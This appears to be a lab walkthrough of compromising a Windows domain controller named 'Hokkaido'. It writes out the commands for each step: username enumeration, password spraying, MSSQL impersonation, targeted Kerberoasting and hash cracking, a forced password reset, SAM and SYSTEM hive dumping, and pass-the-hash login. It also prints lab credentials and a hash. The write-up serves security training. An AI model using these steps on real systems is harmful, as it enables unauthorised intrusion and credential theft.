---
icon: windows
---

# Hokkaido - Intermediate

## Gaining Access

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 192.168.214.40 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 07:31 EDT
Nmap scan report for 192.168.214.40
Host is up (0.028s latency).
Not shown: 65502 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-25 11:32:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
|_ssl-date: 2025-09-25T11:33:54+00:00; +3s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-25T11:33:54+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   192.168.214.40:1433: 
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
|_ssl-date: 2025-09-25T11:33:54+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-03T12:32:14
|_Not valid after:  2054-08-03T12:32:14
| ms-sql-info: 
|   192.168.214.40:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
|_ssl-date: 2025-09-25T11:33:54+00:00; +3s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com0., Site: Default-First-Site-Name)
|_ssl-date: 2025-09-25T11:33:54+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2023-12-07T13:54:18
|_Not valid after:  2024-12-06T13:54:18
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HAERO
|   NetBIOS_Domain_Name: HAERO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hokkaido-aerospace.com
|   DNS_Computer_Name: dc.hokkaido-aerospace.com
|   DNS_Tree_Name: hokkaido-aerospace.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-09-25T11:33:44+00:00
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Not valid before: 2025-09-24T11:31:21
|_Not valid after:  2026-03-26T11:31:21
|_ssl-date: 2025-09-25T11:33:54+00:00; +3s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: 403 - Forbidden: Access is denied.
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
8531/tcp  open  unknown
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
58538/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   192.168.214.40:58538: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 58538
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-08-03T12:32:14
|_Not valid after:  2054-08-03T12:32:14
| ms-sql-ntlm-info: 
|   192.168.214.40:58538: 
|     Target_Name: HAERO
|     NetBIOS_Domain_Name: HAERO
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: hokkaido-aerospace.com
|     DNS_Computer_Name: dc.hokkaido-aerospace.com
|     DNS_Tree_Name: hokkaido-aerospace.com
|_    Product_Version: 10.0.20348
|_ssl-date: 2025-09-25T11:33:54+00:00; +3s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/25%OT=53%CT=1%CU=38060%PV=Y%DS=4%DC=T%G=Y%TM=68D528A
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=103%TI=I%CI=I%TS=A)SEQ(SP=1
OS:02%GCD=1%ISR=109%TI=I%CI=I%TS=A)SEQ(SP=104%GCD=1%ISR=104%TI=I%CI=I%TS=A)
OS:SEQ(SP=105%GCD=1%ISR=109%TI=I%CI=I%TS=A)SEQ(SP=FD%GCD=1%ISR=109%TI=I%CI=
OS:I%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%
OS:O5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W
OS:6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-25T11:33:44
|_  start_date: N/A
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   30.08 ms 192.168.45.1
2   30.06 ms 192.168.45.254
3   30.11 ms 192.168.251.1
4   25.56 ms 192.168.214.40
```

The ldap scan gives us the Domain names of hokkaido-aerospace.com dc.hokkaido-aerospace.com I'll add it them to my /etc/hosts/ file

```
192.168.214.40 	hokkaido-aerospace.com dc.hokkaido-aerospace.com
```

smb & ldap don't seem to be providing us with anything useful. So I tried brute forcing some usernames with [**kerbrute**](https://github.com/ropnop/kerbrute/releases):

### <mark style="color:$primary;">Kerbrute</mark>

```
kerbrute userenum --dc 192.168.214.40 -d hokkaido-aerospace.com ~/tools/SecLists/Usernames/xato-net-10-million-usernames.txt
```

<figure><img src="../../.gitbook/assets/image (1333).png" alt=""><figcaption></figcaption></figure>

we got 2 interesting usernames info and discovery

<figure><img src="../../.gitbook/assets/image (1334).png" alt=""><figcaption></figcaption></figure>

info's password is the same as its useranme, while testing that I saw I have read and write access to the homes share. I am going to check it out

### <mark style="color:$primary;">Smb Enumeration</mark>

```
smbclient \\\\192.168.214.40\\homes -U 'info%info'
```

<figure><img src="../../.gitbook/assets/image (1335).png" alt=""><figcaption></figcaption></figure>

it's empty directories for all of the users, I can dump these users with RID-Cycling. I am going to check the other shares before doing that

```
smbclient \\\\192.168.214.40\\NETLOGON -U 'info%info'
```

<figure><img src="../../.gitbook/assets/image (1340).png" alt=""><figcaption></figcaption></figure>

These users had an initial password. Let's see if someone forgot to change it, I'll dump the users first and then I'll do Credential Spraying

### <mark style="color:$primary;">RID-Cycling</mark>

```
netexec smb hokkaido-aerospace.com -u info -p info --rid-brute | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users
```

<figure><img src="../../.gitbook/assets/image (1336).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Credential Spraying</mark>

```
netexec smb 192.168.214.40 -u users -p 'Start123!' --continue-on-success
```

<figure><img src="../../.gitbook/assets/image (1341).png" alt=""><figcaption></figcaption></figure>

We got discovery's password!

### <mark style="color:$primary;">Enumerating MSSQL Port 1433</mark>

<figure><img src="../../.gitbook/assets/image (1342).png" alt=""><figcaption></figcaption></figure>

```
impacket-mssqlclient discovery:'Start123!'@192.168.214.40 -windows-auth
```

<figure><img src="../../.gitbook/assets/image (1343).png" alt=""><figcaption></figcaption></figure>

No luck with xp\_cmdshell. I don't have permissions to use the hrappdb. Let's see if there is any user I can impersonate on mssql

```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

<figure><img src="../../.gitbook/assets/image (1344).png" alt=""><figcaption></figcaption></figure>

hrappdb-reader is a user we can impersonate. lets login as that user and use hrappdb database.

```
EXECUTE AS LOGIN = 'hrappdb-reader'
use hrappdb
```

<figure><img src="../../.gitbook/assets/image (1345).png" alt=""><figcaption></figcaption></figure>

```
SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
```

<figure><img src="../../.gitbook/assets/image (1346).png" alt=""><figcaption></figcaption></figure>

```
select * from sysauth;
```

<figure><img src="../../.gitbook/assets/image (1347).png" alt=""><figcaption></figcaption></figure>

and we got a new set of credentials&#x20;

```
hrapp-service:Untimed$Runny
```

I am going to do bloodhound collection using netexec, and take a look at bloodhound

### <mark style="color:$primary;">Bloodhound</mark>

```
netexec ldap 192.168.214.40 -u info -p info --bloodhound --collection All --dns-server 192.168.214.40
```

I am going to start bloodhound, and take a look

```
sudo neo4j start
bloodhound
```

<figure><img src="../../.gitbook/assets/image (1348).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1349).png" alt=""><figcaption></figcaption></figure>

Hrapp-service has genericwrite on hazel.green

I am going to use [**targetedKerberoast**](https://github.com/ShutdownRepo/targetedKerberoast) to grab hazel.green's hash

### <mark style="color:$primary;">GenericWrite</mark>

```
python3 ~/tools/Windows/targetedKerberoast/targetedKerberoast.py -u hrapp-service -p 'Untimed$Runny' -d "hokkaido-aerospace.com" --dc-ip 192.168.214.40
```

<figure><img src="../../.gitbook/assets/image (1350).png" alt=""><figcaption></figcaption></figure>

I am going to save her hash and try to crack it

```
hashcat krb5tgs-hazel.hash /usr/share/wordlists/rockyou.txt
```

```
hashcat krb5tgs-hazel.hash /usr/share/wordlists/rockyou.txt --show
```

<figure><img src="../../.gitbook/assets/image (1351).png" alt=""><figcaption></figcaption></figure>

```
hazel.green:haze1988
```

### <mark style="color:$primary;">Change Group Member's Password</mark>

Let's enumerate hazel.green

<figure><img src="../../.gitbook/assets/image (1352).png" alt=""><figcaption></figcaption></figure>

We know hazel.green is part of the IT Group Let's see who else is part of the IT Group

<figure><img src="../../.gitbook/assets/image (1353).png" alt=""><figcaption></figcaption></figure>

Molly.Smith is part of tier 1 admin group! And we know Tier1 admin's can RDP into the machine!

<figure><img src="../../.gitbook/assets/image (1354).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1355).png" alt=""><figcaption></figcaption></figure>

Since hazel.green is part of the IT Group we can forcefully Change Molly.smith's password

```
rpcclient -N 192.168.214.40 -U 'hazel.green%haze1988'
setuserinfo2 MOLLY.SMITH 23 'Password123!'
```

<figure><img src="../../.gitbook/assets/image (1356).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1357).png" alt=""><figcaption></figcaption></figure>

it worked! I am going to rdp into the machine

```
xfreerdp3 /v:192.168.214.40 /u:molly.smith /p:'Password123!' /clipboard /dynamic-resolution /cert:ignore
```

<figure><img src="../../.gitbook/assets/image (1360).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

open command prompt as administrator and give it molly's user and password

<figure><img src="../../.gitbook/assets/image (1306).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1307).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">SeBackupPrivilege</mark>

Since we have SeBackupPrivilege lets copy the SAM and SYSTEM files to our machine

```
reg save hklm\sam sam
reg save hklm\system system
```

<figure><img src="../../.gitbook/assets/image (1308).png" alt=""><figcaption></figcaption></figure>

I am going to place them in the homes share folder that is accessible via smb for ease of access

<figure><img src="../../.gitbook/assets/image (1310).png" alt=""><figcaption></figcaption></figure>

```
smbclient \\\\192.168.214.40\\homes -U molly.smith%'Password123!'
```

<figure><img src="../../.gitbook/assets/image (1311).png" alt=""><figcaption></figcaption></figure>

```
impacket-secretsdump -system system -sam sam local
```

<figure><img src="../../.gitbook/assets/image (1312).png" alt=""><figcaption></figcaption></figure>

```
evil-winrm -i 192.168.214.40 -u administrator -H "d752482897d54e239376fddb2a2109e4"
```

<figure><img src="../../.gitbook/assets/image (1313).png" alt=""><figcaption></figcaption></figure>

